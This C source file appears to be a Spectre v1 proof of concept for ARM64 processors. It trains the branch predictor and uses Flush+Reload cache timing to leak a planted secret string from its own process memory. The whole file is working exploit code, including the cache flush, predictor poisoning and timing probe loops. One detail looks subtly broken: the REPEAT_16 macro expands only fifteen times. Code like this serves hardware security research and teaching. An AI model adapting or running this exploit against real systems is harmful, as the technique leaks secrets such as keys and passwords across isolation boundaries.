#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include "utils.h"

#define STRIDE 4096
#define RELOAD_BUF_SIZE STRIDE * 256
#define ITER 200

#define MOV(n)	\
	asm volatile(	\
		".rept %0\n" \
		"mov x10, x10\n" \
		".endr\n"	\
		::"i" (n): "x10" \
	)

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define EORS(n) \
    asm volatile( \
        ".rept %0\n" \
        "eor x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define ADDS(n) \
    asm volatile( \
        ".rept %0\n" \
        "adds x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define REPEAT_16(x)  x x x x x x x x x x x x x x x
#define REPEAT_8(x)  x x x x x x x x

static unsigned int size __attribute__((aligned(4096))) = 16;
uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t *reloadbuffer;
char *secret = "SPECTRE_EXECUTE!";
static unsigned char data __attribute__((aligned(4096))) = 32;
static volatile uint8_t pick = 0; 

/*
 * Measure the latency: check whether dco kicks in
 */


static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
	asm volatile("movi d0, #0\n\r");
#ifdef N
	MOV(N);
#endif
	register size_t size_reg = size;
	cacheflush(&data);
	barrier();
	isb();
	NOPS(100);

	/*
	 * Spectre v1 runahead
	 */
	pick = data;
	asm volatile (
		"fcvtzs x2, d0\n\r"
		"adds %[index], %[index], x2\n\r"
    	: [index] "+r" (size_reg)        
    		:                            
    		: "x2", "x3", "x4", "x5"                      
		);
	if (index < size_reg)
	{	
		pick = reloadbuffer[fake_buffer[index] << 12];
	}
}

static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *byte) {
	int index, max = 0;
	size_t train_index, probe_addr;
	int results[256];
	int hit = 0;


	int random_int;
	uint64_t init, end;

	memset(results, 0 , sizeof(int) * 256);
	for (int tries = ITER; tries > 0; tries--) {

		/*
		 * flush reload buffer
		 */
		for (int i = 0; i < 256; i++)
			cacheflush(&reloadbuffer[i * STRIDE]); 

		train_index = tries % size;
		for (int j = 0; j <= 10; j++) {

			/*
			 *poison branch predictor
			 */
			random_int = random(5, 7);
			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
			probe_addr = (probe_addr | (probe_addr >> 8)); 
			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
			for(volatile int z = 0; z < 100; z++){}
			isb();
			EORS(300);
			spectre_v1(probe_addr);
		}

		/*
		 * reload reload buffer 
		 */
		for (int i = 0; i < 256; i++)
		{
			index = ((i * 167) + 13) & 255;  // mixed access order

			isb();
			init = get_cycles();
			pick = reloadbuffer[index * STRIDE];
			end = get_cycles();
			isb();
			if (end - init <= 190 && index != fake_buffer[tries % size])
				results[index]++; 
		}

	}

	max = results[0];
	for(int m = 0; m < 256; m++){
		if(results[m] > max){
			max = results[m];
			hit = m;
		}
	}
	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
	*byte = (uint8_t)hit;
}

int main(int argc, const char * * argv) {
	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);

	size_t offset = (size_t)(secret - (char *)fake_buffer);
	int secret_len = strlen(secret);
	uint8_t byte;
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);

	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);

	/*
	 * Repeat 16 times, avoid using loops
	 */
	int i =  0;
	REPEAT_16(
		leak(offset + i, &byte);
		leaked[i] = byte;
		i = i + 1;		
	);

	for(int i = 0; i < secret_len; i++){
		printf("%c", leaked[i]);
	}
	printf("\n");

	free(leaked);
	leaked = NULL;
	return 0;
}
